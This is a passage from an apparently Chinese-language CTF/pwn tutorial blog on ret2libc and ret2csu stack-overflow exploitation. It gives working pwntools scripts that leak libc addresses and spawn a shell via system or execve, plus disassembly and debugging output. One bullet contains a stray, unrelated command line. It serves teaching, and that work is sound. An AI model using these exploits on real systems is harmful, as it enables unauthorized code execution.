alt="image-20250827164038898"></p><p>这里笔者不想一个个试，于是笔者想到多泄露几个函数的地址可能会缩小libc可能的范围，于是修改脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr_start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># 获取_start函数的地址</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># got表中指向__libc_start_main的指针</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(puts_got)<br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#从进程输出里接收数据，截取前 4 个字节，并把它们转成一个 32 位整数</span><br>puts_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_puts：&#x27;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment">#再次获取，这次获取_start函数的真实地址</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(libc_start_main)<br>r.sendline(payload)<br><br>real_addr_start = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_start：&#x27;</span>+<span class="hljs-built_in">hex</span>(real_addr_start))<br></code></pre></td></tr></table></figure><p>运行之后再次尝试果然锁定了libc：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827170822793.png" alt="image-20250827170822793"></p><p><strong>基地址 = 真实地址 - 偏移地址</strong>，知道偏移之后那我们就能写最终的利用脚本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>addr_start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment"># 获取_start函数的地址</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<span class="hljs-comment"># got表中指向__libc_start_main的指针</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(puts_got)<br>r.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>,payload)<br><br><span class="hljs-comment">#从进程输出里接收数据，截取前 4 个字节，并把它们转成一个 32 位整数</span><br>puts_addr = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_puts：&#x27;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment">#再次获取，这次获取_start函数的真实地址</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(puts_plt) + p32(addr_start) + p32(libc_start_main)<br>r.sendline(payload)<br><br>real_addr_start = u32(r.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;real_addr_start：&#x27;</span>+<span class="hljs-built_in">hex</span>(real_addr_start))<br><br><span class="hljs-comment">#找到system函数和bin/sh之后执行利用程序，进入shell</span><br><span class="hljs-comment">#获取基地址</span><br>libc_start_offset = <span class="hljs-number">0x1ade0</span><br>base_libc = real_addr_start - libc_start_offset<br>offset_system=<span class="hljs-number">0x41780</span><br>offset_bin_sh = <span class="hljs-number">0x18e363</span><br><span class="hljs-comment">#计算真实地址</span><br>libc_system=base_libc+offset_system<br>libc_bin_sh = base_libc+offset_bin_sh<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(libc_system) + p32(addr_start) + p32(libc_bin_sh)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>利用成功：</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250827171715096.png" alt="image-20250827171715096"></p><h1 id="06-中级ROP">06 中级ROP</h1><p>32位操作系统总的来说除了系统调用是通过寄存器传参的，其他libc库函数都是通过栈来传参的，因此还不算很棘手。但是64位操作系统的函数调用都是通过寄存器传参，库函数调用时寄存器传参的顺序为：<strong>rdi</strong>，<strong>rsi</strong>，<strong>rdx</strong>，<strong>rcx</strong>，<strong>r8</strong>，<strong>r9</strong>。系统调用时参数传递一般为：<strong>rax</strong>传递系统调用号，其余参数传递为<strong>rdi</strong>，<strong>rsi</strong>，<strong>rdx</strong>，<strong>r10</strong>，<strong>r8</strong>，<strong>r9</strong>。</p><p>但是一般程序中很难出现每一个寄存器对应的 gadgets。这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004005A0 ; void _libc_csu_init(void)<br>.text:00000000004005A0                 public __libc_csu_init<br>.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:00000000004005A0<br>.text:00000000004005A0 var_30          = qword ptr -30h<br>.text:00000000004005A0 var_28          = qword ptr -28h<br>.text:00000000004005A0 var_20          = qword ptr -20h<br>.text:00000000004005A0 var_18          = qword ptr -18h<br>.text:00000000004005A0 var_10          = qword ptr -10h<br>.text:00000000004005A0 var_8           = qword ptr -8<br>.text:00000000004005A0<br>.text:00000000004005A0 ; __unwind &#123;<br>.text:00000000004005A0                 mov     [rsp+var_28], rbp<br>.text:00000000004005A5                 mov     [rsp+var_20], r12<br>.text:00000000004005AA                 lea     rbp, cs:600E24h<br>.text:00000000004005B1                 lea     r12, cs:600E24h<br>.text:00000000004005B8                 mov     [rsp+var_18], r13<br>.text:00000000004005BD                 mov     [rsp+var_10], r14<br>.text:00000000004005C2                 mov     [rsp+var_8], r15<br>.text:00000000004005C7                 mov     [rsp+var_30], rbx<br>.text:00000000004005CC                 sub     rsp, 38h<br>.text:00000000004005D0                 sub     rbp, r12<br>.text:00000000004005D3                 mov     r13d, edi<br>.text:00000000004005D6                 mov     r14, rsi<br>.text:00000000004005D9                 sar     rbp, 3<br>.text:00000000004005DD                 mov     r15, rdx<br>.text:00000000004005E0                 call    _init_proc<br>.text:00000000004005E5                 test    rbp, rbp<br>.text:00000000004005E8                 jz      short loc_400606<br>.text:00000000004005EA                 xor     ebx, ebx<br>.text:00000000004005EC                 nop     dword ptr [rax+00h]<br>.text:00000000004005F0<br>.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j<br>.text:00000000004005F0                 mov     rdx, r15<br>.text:00000000004005F3                 mov     rsi, r14<br>.text:00000000004005F6                 mov     edi, r13d<br>.text:00000000004005F9                 call    qword ptr [r12+rbx*8]<br>.text:00000000004005FD                 add     rbx, 1<br>.text:0000000000400601                 cmp     rbx, rbp<br>.text:0000000000400604                 jnz     short loc_4005F0<br>.text:0000000000400606<br>.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j<br>.text:0000000000400606                 pop     rbx<br>.text:000000000040060B                 pop     rbp<br>.text:0000000000400610                 pop     r12<br>.text:0000000000400615                 pop     r13<br>.text:000000000040061A                 pop     r14<br>.text:000000000040061F                 pop     r15<br>.text:0000000000400624                 add     rsp, 38h<br>.text:0000000000400628                 retn<br>.text:0000000000400628 ; &#125; // starts at 4005A0<br>.text:0000000000400628 __libc_csu_init endp<br></code></pre></td></tr></table></figure><p>0x0000000000400606一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</p><p>可以看到0x00000000004005F0到0x00000000004005F6这几段可以通过控制r15、r14、r13d来控制rdx、rsi、edi。edi也就是rdi的低32位，此时rdi的高32位寄存器值为0，因此相当于可以控制rdi。而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。</p><p>通过0x00000000004005FD到0x0000000000400604，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行loc_4005F0，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</p><h2 id="ret2csu">ret2csu</h2><p>题目：蒸米的一步一步学 ROP 之 linux_x64 篇中 <a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">level5</a></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250828153527359.png" alt="image-20250828153527359"></p><p>可以看出是64位程序，并且开启了NX保护，接下来查看漏洞点</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250828154155061.png" alt="image-20250828154155061"></p><p>很明显的栈溢出，那么我们的栈溢出思路大概如下：</p><ol><li>使用write()函数和 __libc_csu_init泄露write()函数的地址并使程序重新执行main函数。</li><li>查找对应libc版本，获取system函数地址</li><li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 system地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。</li><li>再次利用栈溢出执行 libc_csu_gadgets 跳转执行 system(‘/bin/sh’) 获取 shell</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>csu_front_addr = <span class="hljs-number">0x00000000004005F0</span><br>csu_end_addr = <span class="hljs-number">0x0000000000400606</span><br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x400</span>-<span class="hljs-number">0x380</span>+<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment">#设置寄存器的值</span><br>    payload = padding+p64(csu_end_addr)+p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-comment">#执行参数传递</span><br>    payload+=p64(csu_front_addr)<br>    <span class="hljs-comment">#由于rbx+1 = rbp，会继续执行下面的pop，也就是说再pop一遍，这时候填充一些垃圾数据即可</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x38</span>+<span class="hljs-number">6</span>*<span class="hljs-number">8</span>)<br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment"># write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, main_addr)<br><span class="hljs-comment">#获取基地址</span><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br><br><span class="hljs-comment">#获取system的地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-comment">#</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br>bss_base = elf.bss()<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">0</span>,bss_base,<span class="hljs-number">16</span>, main_addr)<br>sh.send(p64(system_addr)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-comment">#执行</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,bss_base,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss_base+<span class="hljs-number">8</span>,main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感觉思路没问题，但是一直报错（尴尬）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[+]</span> Starting local process <span class="hljs-string">&#x27;./level5&#x27;</span>: pid <span class="hljs-number">2098098</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-string">&#x27;/opt/pwn/intermediateROP/level5&#x27;</span><br>    Arch:       amd64-<span class="hljs-number">64</span>-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (<span class="hljs-number">0</span>x400000)<br>    Stripped:   No<br><span class="hljs-selector-attr">[*]</span> Process <span class="hljs-string">&#x27;./level5&#x27;</span> stopped with exit <span class="hljs-selector-tag">code</span> -<span class="hljs-number">11</span> (SIGSEGV) (pid <span class="hljs-number">2098098</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;level5.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">32</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    write_addr = <span class="hljs-built_in">u64</span>(sh<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">8</span>))<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">106</span>, <span class="hljs-keyword">in</span> recv<br>    return self.<span class="hljs-built_in">_recv</span>(numb, timeout) or b<span class="hljs-string">&#x27;&#x27;</span><br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">176</span>, <span class="hljs-keyword">in</span> _recv<br>    <span class="hljs-keyword">if</span> not self<span class="hljs-selector-class">.buffer</span> and not self.<span class="hljs-built_in">_fillbuffer</span>(timeout):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/tube.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">155</span>, <span class="hljs-keyword">in</span> _fillbuffer<br>    data = self<span class="hljs-selector-class">.recv_raw</span>(self<span class="hljs-selector-class">.buffer</span><span class="hljs-selector-class">.get_fill_size</span>())<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/process.py&quot;</span>, <span class="hljs-selector-tag">line</span> <span class="hljs-number">743</span>, <span class="hljs-keyword">in</span> recv_raw<br>    raise EOFError<br>EOFError<br></code></pre></td></tr></table></figure><p>之后换了个buuctf的源文件，发现这个csu正常多了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400650 ; void _libc_csu_init(void)<br>.text:0000000000400650                 public __libc_csu_init<br>.text:0000000000400650 __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:0000000000400650 ; __unwind &#123;<br>.text:0000000000400650                 push    r15<br>.text:0000000000400652                 mov     r15d, edi<br>.text:0000000000400655                 push    r14<br>.text:0000000000400657                 mov     r14, rsi<br>.text:000000000040065A                 push    r13<br>.text:000000000040065C                 mov     r13, rdx<br>.text:000000000040065F                 push    r12<br>.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry<br>.text:0000000000400668                 push    rbp<br>.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:0000000000400670                 push    rbx<br>.text:0000000000400671                 sub     rbp, r12<br>.text:0000000000400674                 xor     ebx, ebx<br>.text:0000000000400676                 sar     rbp, 3<br>.text:000000000040067A                 sub     rsp, 8<br>.text:000000000040067E                 call    _init_proc<br>.text:0000000000400683                 test    rbp, rbp<br>.text:0000000000400686                 jz      short loc_4006A6<br>.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]<br>.text:0000000000400690<br>.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400690                 mov     rdx, r13<br>.text:0000000000400693                 mov     rsi, r14<br>.text:0000000000400696                 mov     edi, r15d<br>.text:0000000000400699                 call    ds:(__frame_dummy_init_array_entry - 600840h)[r12+rbx*8]<br>.text:000000000040069D                 add     rbx, 1<br>.text:00000000004006A1                 cmp     rbx, rbp<br>.text:00000000004006A4                 jnz     short loc_400690<br>.text:00000000004006A6<br>.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j<br>.text:00000000004006A6                 add     rsp, 8<br>.text:00000000004006AA                 pop     rbx<br>.text:00000000004006AB                 pop     rbp<br>.text:00000000004006AC                 pop     r12<br>.text:00000000004006AE                 pop     r13<br>.text:00000000004006B0                 pop     r14<br>.text:00000000004006B2                 pop     r15<br>.text:00000000004006B4                 retn<br>.text:00000000004006B4 ; &#125; // starts at 400650<br>.text:00000000004006B4 __libc_csu_init endp<br></code></pre></td></tr></table></figure><p>那么思路不变，但是可以直接从pop     rbx开始，省略掉add rsp了，重新写一下。由于使用system函数一直失败，在wiki中也有说明，可能是环境变量的问题，所以使用execve来获取shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>csu_front_addr = <span class="hljs-number">0x0000000000400690</span><br>csu_end_addr = <span class="hljs-number">0x00000000004006AA</span><br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x3f0</span>-<span class="hljs-number">0x370</span>+<span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx should be 0,</span><br>    <span class="hljs-comment"># rbp should be 1,enable not to jump</span><br>    <span class="hljs-comment"># r12 should be the function we want to call</span><br>    <span class="hljs-comment"># rdi=edi=r15d</span><br>    <span class="hljs-comment"># rsi=r14</span><br>    <span class="hljs-comment"># rdx=r13</span><br>    <span class="hljs-comment">#设置寄存器的值</span><br>    payload = padding+p64(csu_end_addr)+p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    <span class="hljs-comment">#执行参数传递</span><br>    payload+=p64(csu_front_addr)<br>    <span class="hljs-comment">#由于rbx+1 = rbp，会继续执行下面的pop，也就是说再pop一遍，这时候填充一些垃圾数据即可</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.sendline(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment"># write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><span class="hljs-comment">#获取基地址</span><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br><br><span class="hljs-comment">#获取system的地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br><br><span class="hljs-comment">#</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>bss_base = elf.bss()<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">16</span>,bss_base,<span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-comment">#执行</span><br>sh.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,bss_base,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss_base+<span class="hljs-number">8</span>,main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="其他方式">其他方式</h3><p>由于这道题目原题的远程是禁用了system和execve的，因此上述解法可能在原题中并不适用，原题的提示是要使用mmap和mprotect来解题，我们一起来看一下该怎么解。</p><ul><li><p>xxxxxxxxxx su -s /bin/sh -c “keystone-manage db_sync” keystonesh</p><p>mmap函数创建一块内存区域，将一个文件映射到该区域，进程可以像操作内存一样操作文件</p></li><li><p><em><em>int mprotect(void</em> addr, size_t len, int port)</em>*</p><p>mprotect函数可以改变一块内存区域的权限(以页为单位)，addr参数表示所改变内存区域的起始地址，也是对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限。</p><p>对于prot来说，对应权限依照以下规则改变值</p><p>无法访问 即PROT_NONE：不允许访问，值为 0</p><p>可读权限 即PROT_READ：可读，值加 1</p><p>可写权限 即PROT_WRITE：可读， 值加 2</p><p>可执行权限 即PROT_EXEC：可执行，值加 4</p><p>例如：我们要将某块内存区域权限设置为可读可写可执行，那么mprotect函数中prot参数便应该是1+2+4=7。</p></li></ul><p>思路就可以转变成通过mprotect改变bss段为可读写, 传入shellcode, 然后执行get 